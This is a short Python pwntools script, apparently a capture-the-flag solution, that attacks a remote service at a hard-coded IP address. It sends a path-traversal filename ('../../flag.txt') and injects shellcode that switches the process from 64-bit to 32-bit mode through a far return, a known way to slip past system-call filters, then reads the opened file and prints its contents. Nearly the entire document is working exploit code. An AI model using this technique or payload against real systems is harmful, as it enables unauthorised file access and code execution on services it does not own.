from pwn import *

context.log_level = "error"
p = remote("34.170.146.252", 57267)

p.recvuntil(b"buf address: 0x")
buf_addr = int(p.recvline().strip(), 16)
print(f"buf address: 0x{buf_addr:x}")
p.sendlineafter(b"filename: ", b"../../flag.txt")

DATA = (buf_addr + 0x800) & 0xffffffff

stage32  = shellcraft.i386.linux.read(10, DATA, 0x200)
stage32 += shellcraft.i386.linux.write(1, DATA, "eax")
stage32  = asm(stage32, arch='i386', os='linux')

bytes_list = ",".join(f"0x{b:02x}" for b in stage32)
stub = f"""
.intel_syntax noprefix
.global _start
_start:
    mov rsp, {buf_addr + 0x500}

    lea rax, [rip + stage32]
    push 0x23
    push rax
    retfq

stage32:
    .byte {bytes_list}
"""

payload = asm(stub, arch='amd64', os='linux')

p.sendlineafter(b"shellcode: ", payload)

p.interactive()
